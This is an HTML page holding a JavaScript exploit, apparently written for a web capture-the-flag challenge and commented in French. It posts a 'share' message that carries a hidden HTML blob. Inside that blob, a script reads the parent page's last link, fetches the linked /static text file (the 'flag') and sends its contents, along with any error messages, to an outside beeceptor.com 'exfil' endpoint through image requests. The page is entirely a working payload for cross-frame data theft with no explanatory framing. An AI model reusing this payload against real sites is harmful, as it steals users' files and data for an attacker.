<html><body><script>
(async () => {
  const epic = `
    <script>
      (async () => {
        try {
          const links = [...parent.document.querySelectorAll('a')];
          
          if (!links.length) {
            new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=no_links';
            return;
          }

          // Prendre directement le dernier lien ajouté (flag)
          const a = links[links.length - 1];

          if (!a) {
            new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=not_found';
            return;
          }

          const fileId = a.dataset.id; // récupérer le bon id
          const res = await fetch('/static/' + fileId + '.txt'); // le fichier est probablement rendu ici
          const txt = await res.text();

          new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=' + encodeURIComponent(txt);
        } catch (e) {
          new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=error_' + encodeURIComponent(e.message);
        }
      })();
    <\/script>`;

  const blob = new Blob([epic], { type: 'text/html' });

  window.postMessage({
    type: 'share',
    files: [{ blob, name: 'epic.html', cached: false }]
  }, '*');
})();
</script></body></html>
